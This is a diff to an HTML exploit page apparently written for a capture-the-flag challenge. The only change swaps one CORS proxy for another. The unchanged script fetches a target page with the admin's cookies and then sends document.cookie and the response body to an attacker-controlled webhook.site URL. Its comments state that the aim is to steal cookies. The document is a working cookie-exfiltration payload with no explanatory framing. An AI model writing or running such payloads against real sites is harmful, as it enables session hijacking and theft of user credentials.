@@ -3,8 +3,8 @@
 <head>
     <title>Exploit</title>
     <script>
-        // Step 1: Fetch the vulnerable URL with query params (now via a proxy)
-        fetch('https://cors-anywhere.herokuapp.com/http://chal1.lagncra.sh:8426/?lang=en', {
+        // Step 1: Fetch the vulnerable URL with query params (using AllOrigins as a proxy)
+        fetch('https://api.allorigins.win/raw?url=http://chal1.lagncra.sh:8426/?lang=en', {
             credentials: 'include' // Include admin's cookies in the request
         })
         .then(response => response.text()) // Read response as text
@@ -12,7 +12,7 @@
             // Step 2: Exfiltrate cookies and response body to your webhook via a CORS proxy
             fetch('https://cors-anywhere.herokuapp.com/https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e/steal?cookies=' + document.cookie + '&lang_response=' + encodeURIComponent(data), {
                 headers: {
-                    'Origin': 'http://chal1.lagncra.sh:8426' // Ensure Origin header is set
+                    'Origin': 'http://chal1.lagncra.sh:8426' // Ensure Origin header is set correctly
                 }
             });
         });
